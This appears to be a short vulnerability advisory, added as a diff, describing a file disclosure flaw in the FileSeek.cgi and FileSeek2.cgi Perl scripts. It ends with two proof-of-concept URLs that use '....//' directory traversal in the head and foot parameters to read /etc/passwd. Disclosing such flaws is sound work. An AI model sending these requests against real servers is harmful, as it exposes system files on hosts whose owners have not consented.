@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/6784/info
+
+FileSeek is an example cgi-script from "The CGI/Perl Cookbook from John Wiley &
+Sons". The script is written and maintained by Craig Patchett. It is mainly used to find and download files on a web server.
+
+FileSeek.cgi and FileSeek2.cgi are prone to a file disclosure vulnerability. It is possible for a remote attacker to submit a maliciously crafted web request which is capable of breaking out of the wwwroot directory and browsing arbitrary web-readable files on a host running the vulnerable script.
+
+http://host/cgi-bin/FileSeek.cgi?head=&foot=....//....//....//....//....
+//....//....//etc/passwd
+http://host/cgi-bin/FileSeek.cgi?head=....//....//....//....//....//....
+//....//etc/passwd&foot=
